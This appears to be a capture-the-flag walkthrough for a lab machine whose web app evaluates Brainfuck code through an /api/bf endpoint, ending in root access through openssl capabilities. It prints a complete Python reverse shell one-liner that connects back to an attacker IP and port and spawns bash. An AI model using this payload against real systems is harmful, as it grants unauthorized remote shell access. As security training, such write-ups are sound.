Scanning



There are two TCP ports open on the target machine: SSH and HTTP. There is a web application on port 80. I will start enumeration with this application.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application. The code seems to be in Brainfuck language. Viewing the source-code of the HTML page does not reveal anything.


However, the main.js JavaScript file is interesting as it contains the code above.


It looks like the requests are handled by the /api/bf. I intercepted the request using Burpsuite and received the output above.


Sending in a garbage input shows the output above. It is likely the backend is handled using Python; therefore, I should be able to encode a Python payload in Brainfuck to gain a reverse shell.

Exploitation



The Python payload I used is mentioned below. I used an online website to convert the Python reverse shell payload to Brainfuck code. Then I used Burpsuite to send the payload to /api/bf. Then I received a reverse shell connection on port 8443.
Python payload used: import os,pty,socket;s=socket.socket();s.connect(("10.14.55.153",8443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash").

Privilege Escalation


The binary openssl is interesting as it has capabilities set we can exploit.


Doing a Google search about this lead me to the website above. I followed the steps above.


After creating the exploit in C, compiling it on my machine, transferring it to the target machine, and executing it by loading the exploit, I gained a root shell.
